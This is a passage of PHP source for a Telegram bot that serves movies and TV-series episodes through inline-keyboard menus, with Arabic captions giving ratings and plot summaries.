[['text'=>'Persuasion 2007','callback_data'=>"aflam7"],['text'=>'Up 2009','callback_data'=>"aflam6"]],
[['text'=>'safe','callback_data'=>"aflam5"],['text'=>'dont breathe','callback_data'=>"aflam16"]],
[['text'=>'Fury  2014','callback_data'=>"aflam9"],['text'=>'the Town','callback_data'=>"aflam10"]],
[['text'=>'1917','callback_data'=>"aflam11"],['text'=>'A Private War 2018','callback_data'=>"aflam12"]],
[['text'=>'robin hood','callback_data'=>"aflam13"],['text'=>'wild card','callback_data'=>"aflam14"]],
[['text'=>'hoobs and shaw','callback_data'=>"aflam15"]],
[['text'=>'FORREST GUMP','callback_data'=>"aflam17"]],
[['text'=>'Hellboy','callback_data'=>"aflam18"]],
[['text'=>'𝙱𝙰𝙲𝙺 ➪','callback_data'=>"aflam"]],
]
])
]);
}

if($data=="aflam14"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/rrokkkaaa/15248?single",
'caption'=>" 
تدور أحداث العمل حول (نِك وايلد) المقامر الذي قاده القمار لشوارع (لاس فيجاس)، ولكنه يحاول أن يتوقف عن القمار، وهو أيضًا يقوم بأنشطة غير اعتيادية لكسب المال، مثل توفير الحماية لمن يستأجرونه، ولأصدقائه، فهل ستستمر حياته على هذا النحو؟
",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="aflam4"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/rrokkkaaa/15247?single",
'caption'=>" 
Fast.And.Furious.8
",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="aflam12"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/ggggldjql/236",
'caption'=>"
اسم الفيلم : A Private War (2018)
التقييم : 8.6
تصنيف:: سيرة ذاتيه - دراما - حرب
تدور الأحداث حول واحدة من أشهر مراسلي الحروب وهي (ماري كولفين)، فهي شخصية لا تعرف الخوف كما، أنها متمردة وتدفع بنفسها للخطوط الأمامية للصراعات في جميع أنحاء العالم لإعطاء صوت لمن لا صوت لهم.
",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="aflam11"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NF/1025",
'caption'=>"اسم الفيلم : 1917

التقييم : 8.7

النوع : #دراما - #حرب 

قصة الفيلم :يتم إعطاء جنديين بريطانيين شابين خلال الحرب العالمية الأولى مهمة مستحيلة: إيصال رسالة في عمق أراضي العدو ستوقف 1600 رجل ، و أحد إخوة الجنود ، عن السير مباشرة الي فخ مميت",
'reply_to_message_id'=>$message->message_id, 
]);
}
if($data=="aflam17"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/ggggldjql/226",
'caption'=>"

اسم الفيلم : FORREST GUMP 
IMDb : 8.8
النوع : دراما - رومانسية 


تدور أحداث الفيلم حول (فورست جامب) المعاق وبطئ الفهم، والذي رفضت والدته إدخاله مدرسة فكرية حتي لا يشعر بالنقص، لكن أدخلته مدرسة عادية، وكان يتعرض هناك إلى الكثير من المضايقات لحالته، مما يدفعه ذلك للمشاركة في مباراة للركبى، ويصبح بطلا في اللعبة دون تخطيط مسبق، ثم بعد ذلك يلتحق بالجيش ويشترك في حرب فيتنام ويحصل على نوط الشجاعة من رئيس الدولة بعد إنقاذه خمسة جنود في إحدى الغارات.",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="aflam13"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NF/868",
'caption'=>"الاسم : Robin Hood 2018
التقييم : 5.3
ألنوع : اكشن, مغامرات, اثارة
القصة : يقوم (روبن) وقائده المغاربي (ليتل جون) بتنظيم ثورة جريئة ضد التاج الإنجليزي الفاسد في مغامرة مثيرة مليئة بمنافسات ساحقة في ساحة المعركة.",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="aflam7"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/ggggldjql/232",
'caption'=>"
الاسم : Persuasion 2007
التقييم : 7.5
النوع : دراما، رومانس
القصة : عن رواية جين أوستن “الإقناع” فيلم تلفزيوني يرسم صورة للمجتمع الإنجليزي في العصر القديم، تدخل الناس في خصوصيات الآخرين وإقناعهم بأنهم يعرفون مصلحتهم أكثر منهم، مما قد يفقدهم حب حياتهم ويتركهم يصارعون الوحدة وحياة مكرسة لغيرهم.
",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="aflam6"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/ggggldjql/234",
'caption'=>"
الاسم : Up 2009
التقييم : 8.2
النوع : انميشن، مغامرات، كوميدي، عائلي
القصة : يسافر كارل فريدريكسن البالغ من العمر 78 عامًا إلى شلالات بارادايس في منزله المجهز بالبالونات ، ويأخذ عن غير قصد طريقًا خلابًا.
",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="aflam10"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NF/766",
'caption'=>"الاسم : The Town 2010
التقييم : 7.5
النوع : جريمة, دراما, اثارة
القصة : مجموعة من الأصدقاء من حي تشالزتاون في بوسطن يقومون بسرقة بنك، فيحاول أحد عملاء مكتب التحقيقات الفيدارلي القبض عليهم وفي نفس الوقت يقع رئيس اللصوص في حب مديرة البنك.",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="aflam9"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NF/713",
'caption'=>"

طلبات الاعضاء
اسم الفلم : Fury 2014 
التقييم : 7.6
النوع : اكشن , دراما , حرب 
القصة : في إبريل عام 1945 حينما كان الحلفاء يضعون لمساتهم الأخيرة على مسرح الأحداث الأوروبية، كان الخبير الحربي الرقيب واردادي (براد بيت) – وتحت قيادته طاقم من خمسة جنود – يقود دبابة من طراز (شيرمان) في مهمة انتحارية خلف خطوط العدو.",
'reply_to_message_id'=>$message->message_id, 
]);
} 

if($data=="aflam18"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/ggggldjql/230",
'caption'=>"مدة  العرض : 120 دقيقة
سنة الاصدار : 2019
الجودة : BluRay
النوع : اكشن - مغامرة - خيال
التقييم العالمي : 10 / 6.3  |  29,635 votes

ملخص القصة:
هيل بوي العالق بين عالمين متنافرين: العالم الفائق للطبيعة، والعالم البشري اﻹعتيادي، حيث يدخل هذه المرة في صراع مفتوح مع ساحرة من العصور البائدة أقسمت على الانتقام وعلى تدمير الجنس البشري بأكمله.",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="aflam16"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NF/713",
'caption'=>"
اسم الفلم : Don't Breathe 2016
التقييم : 7.1
النوع : جريمة , رعب , اثارة 
القصة : روكي فتاة شابة تحاول أن تبدأ حياة جديدة مع شقيقتها، وتخطط مع حبيبها وصديق آخر لهم لاقتحام وسرقة منزل رجل ضرير ثري، وقد راودهم الظن بأنهم سيقترفوا الجريمة الكاملة التي لا تشوبها شائبة بما أن الرجل ضرير، ولكنهم يكتشفوا خطأهم ويحاولوا أن ينجوا بأرواحهم منه بعد اكتشافهم بأنه قاتل متسلسل..",
'reply_to_message_id'=>$message->message_id, 
]);
} 

if($data=="aflam15"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NF/210",
'caption'=>" 
يقدم الفيلم قصة منفصلة عن سلسلة أفلام The Fast and The Furious، حيث يقرر عميل اﻷمن الدبلوماسي اﻷمريكي (لوك هوبس) بالتحالف على نحو غير متوقع مع المنبوذ (ديكارد شاو) لكي يواجهها معًا شرير محسن جينيًا يهدد مستقبل الإنسانية.",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="aflam3"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NF/205",
'caption'=>" 
Furious.Seven.2015",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="aflam5"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/rrokkkaaa/15246?single",
'caption'=>" 
يجد (رايت) نفسه مسئولًا عن الفتاة (ماي) البالغة من العمر اثنتى عشر عامًا، ويبحث عنها لصوص صينيون ومجموعة من الروس بسبب حيازتها معلومات سرية غاية في الأهمية ممثلة في كود رقمي لا يقدر بثمن، ووسط المطاردات التي تلاحقه يقرر إنقاذها مهما كلفه الأمر.",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="serii" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
اختر المسلسل 🎞
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>'Dark','callback_data'=>"darkk"],['text'=>'The End of the Fucking World','callback_data'=>"TEOTF"]],
[['text'=>'Chernobyl','callback_data'=>"cherno"]],
[['text'=>'Black Mirror','callback_data'=>"blackm"],['text'=>'Lucifer','callback_data'=>"lucix"]],
[['text'=>'See','callback_data'=>"seeb"]],
[['text'=>'The Witcher','callback_data'=>"witchr"],['text'=>'sherlock Holmes','callback_data'=>"uoy"]],
[['text'=>'𝙱𝙰𝙲𝙺 ➪','callback_data'=>"aflam"]],
]
])
]);
}


if($data=="uoy" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
اسم المسلسل : Sherlock
التقييم الحالي : 9.2
النوع : اكشن, مغامرات, دراما, خيالي
بصفته محقق استشاري، يُستدعَى (شرلوك هولمز) لحل القضايا التي يثبُت أنها مستعصية الحل على المحققين الرسميين النمطيين. وتُخبر القصص أنه كان قادراً في العديد من المناسبات على حل القضايا بدون مُغادرة بيته، فقط عن طريق التحليل المنطقي
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[

[['text'=>'Sherlock Holmes S1 ','callback_data'=>"holmes1"]],
[['text'=>'Sherlock Holmes S2 ','callback_data'=>"holmes2"]],
[['text'=>'Sherlock Holmes S3 ','callback_data'=>"holmes3"]],
[['text'=>'Sherlock Holmes S4 ','callback_data'=>"holmes4"]],
[['text'=>'𝙱𝙰𝙲𝙺 ➪','callback_data'=>"serii"]],
]
])
]);
}
if($data=="holmes1" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
اختر الحلقة 💥 🎞
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>'Sherlock Holmes, 1','callback_data'=>"hcsllx1"],['text'=>'Sherlock Holmes , 2','callback_data'=>"hcsllx2"]],
[['text'=>'Sherlock Holmes, 3','callback_data'=>"hcsllx3"]],
[['text'=>'𝙱𝙰𝙲𝙺 ➪','callback_data'=>"uoy"]],
]
])
]);
}

if($data=="hcsllx1"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/602",
'caption'=>" 

 ",
'reply_to_message_id'=>$message->message_id, 
]);
}



if($data=="hcsllx2"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/603",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}
if($data=="hcsllx3"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/604",
'caption'=>" 
.",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="holmes2" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
اختر الحلقة 💥 🎞
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>'Sherlock Holmes, 1','callback_data'=>"hsllx1"],['text'=>'Sherlock Holmes , 2','callback_data'=>"hsllx2"]],
[['text'=>'Sherlock Holmes, 3','callback_data'=>"hsllx3"]],
[['text'=>'𝙱𝙰𝙲𝙺 ➪','callback_data'=>"uoy"]],
]
])
]);
}

if($data=="hsllx1"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/606",
'caption'=>" 

 ",
'reply_to_message_id'=>$message->message_id, 
]);
}



if($data=="hsllx2"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/607",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}
if($data=="hsllx3"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/608",
'caption'=>" 
.",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="holmes3" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
اختر الحلقة 💥 🎞
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>'Sherlock Holmes, 1','callback_data'=>"hslx1"],['text'=>'Sherlock Holmes , 2','callback_data'=>"hslx2"]],
[['text'=>'Sherlock Holmes, 3','callback_data'=>"hslx3"]],
[['text'=>'𝙱𝙰𝙲𝙺 ➪','callback_data'=>"uoy"]],
]
])
]);
}

if($data=="hslx1"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/610",
'caption'=>" 

 ",
'reply_to_message_id'=>$message->message_id, 
]);
}



if($data=="hslx2"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/611",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}
if($data=="hslx3"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/612",
'caption'=>" 
.",
'reply_to_message_id'=>$message->message_id, 
]);
}


if($data=="holmes4" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
اختر الحلقة 💥 🎞
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>'Sherlock Holmes, 1','callback_data'=>"shol1"],['text'=>'Sherlock Holmes , 2','callback_data'=>"shol2"]],
[['text'=>'Sherlock Holmes, 3','callback_data'=>"shol3"],['text'=>'Sherlock Holmes, 4','callback_data'=>"shol4"]],
[['text'=>'𝙱𝙰𝙲𝙺 ➪','callback_data'=>"uoy"]],
]
])
]);
}

if($data=="shol1"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/614",
'caption'=>" 

 ",
'reply_to_message_id'=>$message->message_id, 
]);
}



if($data=="shol2"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/615",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}
if($data=="shol3"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/616",
'caption'=>" 
.",
'reply_to_message_id'=>$message->message_id, 
]);
}
if($data=="shol4"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/617",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="witchr" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
اسم المسلسل : The Witcher 2019
التقييم الحالي : 9.5
النوع : اكشن, مغامرات, دراما, خيالي
القصة : يكافح جيرالت أوف ريفيا ، وهو صياد وحوش منعزل ، للعثور على مكانه في عالم حيث يثبت الناس في كثير من الأحيان أنهم أكثر شراً من الوحوش .
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[

[['text'=>'The Witcher S1 ','callback_data'=>"witchr1"]],
[['text'=>'𝙱𝙰𝙲𝙺 ➪','callback_data'=>"serii"]],
]
])
]);
}

if($data=="witchr1" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
اختر الحلقة 💥 🎞
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>'The Witcher, 1','callback_data'=>"tws1"],['text'=>'The Witcher , 2','callback_data'=>"tws2"]],
[['text'=>'The Witcher, 3','callback_data'=>"tws3"],['text'=>'The Witcher, 4','callback_data'=>"tws4"]],
[['text'=>'The Witcher- 5','callback_data'=>"tws5"],['text'=>'The Witcher- 6','callback_data'=>"tws6"]],
[['text'=>'The Witcher- 7','callback_data'=>"tws7"],['text'=>'The Witcher- 8','callback_data'=>"tws8"]],
[['text'=>'𝙱𝙰𝙲𝙺 ➪','callback_data'=>"witchr"]],
]
])
]);
}

if($data=="tws1"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/592",
'caption'=>" 

 ",
'reply_to_message_id'=>$message->message_id, 
]);
}



if($data=="tws2"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/593",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}
if($data=="tws3"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/594",
'caption'=>" 
.",
'reply_to_message_id'=>$message->message_id, 
]);
}
if($data=="tws4"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/595",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}
if($data=="tws5"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/596",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}
if($data=="tws6"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/597",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="tws7"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/598",
'caption'=>" 
",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="tws8"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/599",
'caption'=>" 
",
'reply_to_message_id'=>$message->message_id,
]);
}



if($data=="seeb" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
اسم المسلسل : See 
التقييم : 8.9
النوع : دراما , خيال علمي 
عدد الحلقات : 10 
القصة : في المستقبل البعيد بعد انتشار فيروس يقضي على البشرية ويتسبب بجعل ما تبقى منهم فاقدين للبصر ، لكن عندما يولد توأم يستطيعان النظر يصبحا مستهدفين ، فيجد والدهما نفسه في قصة لا تنتهي حيث يتحتم عليهم إيجاد طرق للمحافظة على بقائهم وحمايتهم
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[

[['text'=>'See S1 ','callback_data'=>"seeb1"]],
[['text'=>'𝙱𝙰𝙲𝙺 ➪','callback_data'=>"serii"]],
]
])
]);
}

if($data=="seeb1" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
اختر الحلقة 💥 🎞
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>'see, 1','callback_data'=>"saab1"],['text'=>'see , 2','callback_data'=>"saab2"]],
[['text'=>'see, 3','callback_data'=>"saab3"],['text'=>'see, 4','callback_data'=>"saab4"]],
[['text'=>'see- 5','callback_data'=>"saab5"],['text'=>'see- 6','callback_data'=>"saab6"]],
[['text'=>'see- 7','callback_data'=>"saab7"],['text'=>'see- 8','callback_data'=>"saab8"]],
[['text'=>'𝙱𝙰𝙲𝙺 ➪','callback_data'=>"seeb"]],
]
])
]);
}

if($data=="saab1"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/582",
'caption'=>" 

 ",
'reply_to_message_id'=>$message->message_id, 
]);
}



if($data=="saab2"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/583",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}
if($data=="saab3"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/584",
'caption'=>" 
.",
'reply_to_message_id'=>$message->message_id, 
]);
}
if($data=="saab4"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/585",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}
if($data=="saab5"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/586",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}
if($data=="saab6"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/587",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="saab7"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/588",
'caption'=>" 
",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="saab8"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/589",
'caption'=>" 
",
'reply_to_message_id'=>$message->message_id,
]);
}

if($data=="lucix" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
اسم المسلسل : Lucifer 
سنة الانتاج : 2015
التقييم : 8.2
النوع : جريمة, دراما, خيال
القصة : قرر لوسيفر مورننجستار أن يكون لديه ما يكفي من الخادمات الجليلة في الجحيم ويقرر قضاء بعض الوقت على الأرض لفهم الإنسانية بشكل أفضل. استقر في لوس أنجلوس - مدينة الملائكة.
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>'Lucifer S1','callback_data'=>"luci1"],['text'=>'Lucifer S2','callback_data'=>"luci2"]],
[['text'=>'Lucifer S3 ','callback_data'=>"luci3"]],
[['text'=>'Lucifer S4','callback_data'=>"luci4"],['text'=>'Lucifer S5','callback_data'=>"luci5"]],
[['text'=>'𝙱𝙰𝙲𝙺 ➪','callback_data'=>"serii"]],
]
])
]);
}
if($data=="luci2" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
اختر الحلقة 💥 🎞
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>'Lucifer, 1','callback_data'=>"lucif1"],['text'=>'Lucifer , 2','callback_data'=>"lucif2"]],
[['text'=>'Lucifer, 3','callback_data'=>"lucif3"],['text'=>'Lucifer, 4','callback_data'=>"lucif4"]],
[['text'=>'Lucifer- 5','callback_data'=>"lucif5"],['text'=>'Lucifer- 6','callback_data'=>"lucif6"]],
[['text'=>'Lucifer- 7','callback_data'=>"lucif7"],['text'=>'Lucifer- 8','callback_data'=>"lucif8"]],
[['text'=>'Lucifer- 9','callback_data'=>"lucif9"],['text'=>'Lucifer- 10','callback_data'=>"lucif10"]],
[['text'=>'Lucifer- 11','callback_data'=>"lucif11"],['text'=>'Lucifer- 12','callback_data'=>"lucif12"]],
[['text'=>'Lucifer- 13','callback_data'=>"lucif13"],['text'=>'Lucifer- 14','callback_data'=>"lucif14"]],
[['text'=>'Lucifer- 15','callback_data'=>"lucif15"],['text'=>'Lucifer- 16','callback_data'=>"lucif16"]],
